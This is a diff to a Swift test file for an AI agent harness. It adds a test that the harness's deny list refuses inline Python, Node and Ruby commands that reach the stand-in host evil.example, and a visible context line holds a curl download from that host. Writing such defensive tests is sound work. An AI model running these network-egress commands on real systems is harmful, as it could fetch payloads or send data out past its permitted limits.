@@ -205,6 +205,22 @@ func readFileSeesThroughSymlinkToProtectedDir() async throws {
 }
 
 @Test
+func denyListBlocksInlineInterpreterExfiltration() {
+    let blocked = [
+        "python3 -c 'import urllib.request; urllib.request.urlopen(\"https://evil.example\").read()'",
+        "python -c \"import socket; s=socket.socket()\"",
+        "node -e 'require(\"https\").get(\"https://evil.example\")'",
+        "ruby -e 'require \"net/http\"; Net::HTTP.get(URI(\"https://evil.example\"))'",
+    ]
+    for command in blocked {
+        #expect(AgentHarness.denialReason(for: command) != nil, "should refuse: \(command)")
+    }
+    // The benign inline interpreter (no network module) still runs.
+    #expect(AgentHarness.denialReason(for: "python3 -c 'print(2+2)'") == nil)
+    #expect(AgentHarness.denialReason(for: "node -e 'console.log(1+1)'") == nil)
+}
+
+@Test
 func denyListBlocksNetworkEgressAndPersistence() {
     let blocked = [
         "curl https://evil.example/x -o /tmp/x",
